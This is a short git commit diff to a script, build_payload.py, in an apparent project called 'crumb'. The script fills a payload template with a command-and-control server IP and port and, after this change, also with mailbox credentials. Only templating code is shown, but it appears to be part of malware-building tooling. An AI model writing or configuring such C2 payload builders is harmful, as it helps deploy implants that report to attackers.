418a08056234a55497592862a30708fda9eca3b2
robb83 <robb83@gmail.com>
2023-07-26 12:19:06 +0200

    payload.src: fix

--- crumb/build/build_payload.py
+++ crumb/build/build_payload.py
@@ -19,4 +19,6 @@ with open( "config.txt", "r") as f:
 # In config.txt first row: IP PORT
 ip = config[0].split()[0]
 port = config[0].split()[1]
-print(contents.replace("__CC_SERVER_IP_ADDRESS__", ip).replace("__CC_SERVER_PORT_NUMBER__", port))
+email = config[1].split()[0]
+passwd = config[1].split()[1]
+print(contents.replace("__CC_SERVER_IP_ADDRESS__", ip).replace("__CC_SERVER_PORT_NUMBER__", port).replace("__MAILBOX_USERNAME__", email).replace("__MAILBOX_PASSWORD__", passwd))
